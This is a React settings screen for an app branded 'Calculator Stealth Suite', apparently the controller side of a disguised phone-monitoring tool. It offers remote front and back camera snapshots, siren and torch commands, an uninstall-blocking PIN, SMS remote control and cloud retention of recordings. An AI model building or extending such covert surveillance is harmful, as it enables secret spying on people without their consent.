import React, { useState } from "react";
import { useApp } from "@/context/AppContext";
import {
  Settings,
  LogOut,
  Lock,
  Clock,
  Trash2,
  RefreshCw,
  CheckCircle,
  Smartphone,
  Flashlight,
  Volume2,
  Camera,
} from "lucide-react";
import { SettingsCard, CommandButton, AlertBanner } from "@/components/ui/SharedComponents";
import { OfflineSmsGuide } from "./OfflineSmsGuide";

// Config-driven remote commands — add new command = add 1 object
const REMOTE_COMMANDS = [
  { key: "torch",   icon: Flashlight, color: "amber",   getLabel: (on: boolean) => on ? "Torch Band" : "Torch Chalu",     getActive: (_: any, cd: any) => cd.isTorchActive,  getCmd: (_: any, cd: any) => ["TORCH", !cd.isTorchActive] as const },
  { key: "siren",   icon: Volume2,    color: "red",     getLabel: (on: boolean) => on ? "Siren Band" : "Siren Bajayein",  getActive: (_: any, cd: any) => cd.isSirenActive,  getCmd: (_: any, cd: any) => ["SIREN", !cd.isSirenActive] as const },
  { key: "backCam", icon: Camera,     color: "purple",  getLabel: () => "Back Photo",    getDisabled: (c: any) => c.capturingFacing !== null, snap: "back" as const },
  { key: "selfie",  icon: Camera,     color: "blue",    getLabel: () => "Front Selfie",  getDisabled: (c: any) => c.capturingFacing !== null, snap: "front" as const },
  { key: "vibrate", icon: Smartphone, color: "emerald", getLabel: () => "Vibrate (2s)",  getCmd: () => ["VIBRATE", 2000] as const },
  { key: "sync",    icon: RefreshCw,  color: "cyan",    getLabel: () => "Force Sync",    getCmd: () => ["FORCE_SYNC", true] as const },
];

export function SettingsTabContent() {
  const { user, handleLogout: onLogout, childData, commands, stream } = useApp();
  const { simInfo, uninstallPin, isTorchActive, isSirenActive } = childData;
  const { sendCommand, handleRequestSnapshot: onRequestSnapshot, capturingFacing, storageRetentionDays, handleUpdateRetention: onUpdateRetention, isCleaningStorage, cleanupStatusMessage, handleRunAutoClean: onRunAutoClean, handleSaveUninstallPin: onSaveUninstallPin } = commands;
  const [isEditingPin, setIsEditingPin] = useState(false);
  const [pinInputValue, setPinInputValue] = useState(uninstallPin || "123456");

  return (
    <div className="max-w-2xl mx-auto p-4 sm:p-6 bg-[#1B1B24] border border-[#2E2E3C] rounded-2xl shadow-xl flex flex-col gap-6">
      {/* Header */}
      <div className="flex items-center justify-between border-b border-[#2E2E3C] pb-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-blue-600/20 text-blue-400 rounded-xl"><Settings className="w-5 h-5" /></div>
          <div>
            <h2 className="text-base font-bold text-white">App & Device Settings (सेटिंग्स)</h2>
            <p className="text-xs text-gray-400">Uninstall protection, Cloud auto-clean, SMS & Remote controls</p>
          </div>
        </div>
        <button onClick={onLogout} className="px-3 py-1.5 bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition cursor-pointer">
          <LogOut className="w-3.5 h-3.5" /><span>Sign Out</span>
        </button>
      </div>

      {/* 1: Uninstall Protection Password */}
      <SettingsCard icon={Lock} color="amber" title="Uninstall Protection Password" subtitle="6-Digit security PIN required to uninstall or remove app" badge="PROTECTED">
        <div className="p-3 bg-[#1B1B24] rounded-xl border border-[#2B2B38] flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div>
            <span className="text-[10px] uppercase font-bold text-gray-500">Active Uninstall PIN:</span>
            <div className="flex items-center gap-2 mt-0.5">
              <span className="text-xl font-mono font-bold tracking-widest text-emerald-400">{uninstallPin || "123456"}</span>
              <span className="text-[10px] text-gray-400">(Default: 123456)</span>
            </div>
          </div>
          {!isEditingPin ? (
            <button type="button" onClick={() => { setPinInputValue(uninstallPin || "123456"); setIsEditingPin(true); }} className="px-3 py-1.5 bg-blue-600/20 hover:bg-blue-600/30 text-blue-300 border border-blue-500/30 rounded-xl text-xs font-semibold transition cursor-pointer">
              Change PIN (पासवर्ड बदलें)
            </button>
          ) : (
            <div className="flex items-center gap-2 w-full sm:w-auto">
              <input type="text" maxLength={6} value={pinInputValue} onChange={(e) => setPinInputValue(e.target.value.replace(/\D/g, ""))} placeholder="6-digit PIN" className="w-28 px-2.5 py-1.5 bg-[#121217] border border-blue-500/60 rounded-xl text-white font-mono text-center text-sm font-bold focus:outline-none" />
              <button type="button" onClick={() => { onSaveUninstallPin(pinInputValue); setIsEditingPin(false); }} disabled={pinInputValue.length !== 6} className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white rounded-xl text-xs font-bold transition cursor-pointer">Save</button>
              <button type="button" onClick={() => setIsEditingPin(false)} className="px-2.5 py-1.5 bg-[#252530] text-gray-400 hover:text-white rounded-xl text-xs transition cursor-pointer">Cancel</button>
            </div>
          )}
        </div>
      </SettingsCard>

      {/* 2: Cloud 7-Day Auto-Delete & Retention */}
      <SettingsCard icon={Clock} color="blue" title="Cloud Storage 7-Day Auto-Delete" subtitle="Purge snapshots & recordings to keep Firebase 100% Free"
        headerRight={
          <button type="button" onClick={onRunAutoClean} disabled={isCleaningStorage || storageRetentionDays === 0}
            className="px-3 py-1.5 bg-red-600/20 hover:bg-red-600/30 text-red-300 border border-red-500/30 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition cursor-pointer">
            {isCleaningStorage ? <RefreshCw className="w-3.5 h-3.5 animate-spin text-red-400" /> : <Trash2 className="w-3.5 h-3.5 text-red-400" />}
            <span>{isCleaningStorage ? "Cleaning..." : "Clean 7-Day Data Now"}</span>
          </button>
        }>
        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 pt-1">
          {[{ days: 1, label: "1 Day", desc: "Purge daily" }, { days: 7, label: "7 Days", desc: "Recommended (Free tier)" }, { days: 14, label: "14 Days", desc: "Bi-weekly" }, { days: 28, label: "28 Days", desc: "Monthly" }, { days: 0, label: "Never", desc: "Keep forever" }].map((opt) => {
            const sel = storageRetentionDays === opt.days;
            return (
              <button key={opt.days} type="button" onClick={() => onUpdateRetention(opt.days)}
                className={`p-2.5 rounded-xl border text-left transition cursor-pointer flex flex-col justify-between ${sel ? "bg-blue-600/20 border-blue-500 text-blue-300 shadow" : "bg-[#181820] border-[#292938] text-gray-400 hover:border-gray-600"}`}>
                <div className="flex items-center justify-between mb-0.5">
                  <span className={`text-xs font-bold ${sel ? "text-blue-400" : "text-gray-200"}`}>{opt.label}</span>
                  {sel && <CheckCircle className="w-3 h-3 text-blue-400" />}
                </div>
                <span className="text-[10px] text-gray-500">{opt.desc}</span>
              </button>
            );
          })}
        </div>
        <AlertBanner type="success" message={cleanupStatusMessage} />
      </SettingsCard>

      {/* 3: Offline SMS Remote Fallback */}
      <OfflineSmsGuide simInfo={simInfo} />

      {/* 4: Quick Remote Hardware Controls — config-driven */}
      <SettingsCard icon={Smartphone} color="purple" title="Remote Phone Commands"
        headerRight={<span className="text-[10px] text-emerald-400 font-semibold flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> Live RTDB</span>}>
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
          {REMOTE_COMMANDS.map((cmd) => {
            const isActive = cmd.getActive?.(commands, childData) ?? false;
            return (
              <CommandButton
                key={cmd.key}
                icon={cmd.icon}
                color={cmd.color}
                label={cmd.getLabel(isActive)}
                isActive={isActive}
                disabled={cmd.getDisabled?.(commands) ?? false}
                onClick={() => {
                  if (cmd.snap) { onRequestSnapshot(cmd.snap); return; }
                  const [c, v] = cmd.getCmd!(commands, childData);
                  sendCommand(c, v);
                }}
              />
            );
          })}
        </div>
      </SettingsCard>

      {/* Footer Info */}
      <div className="text-center pt-2 text-[11px] text-gray-500">
        <p>Calculator Stealth Suite • Version 2.500</p>
        <p className="font-mono text-[10px] text-gray-600">Firebase Region: asia-southeast1 • P2P WebRTC Direct</p>
      </div>
    </div>
  );
}
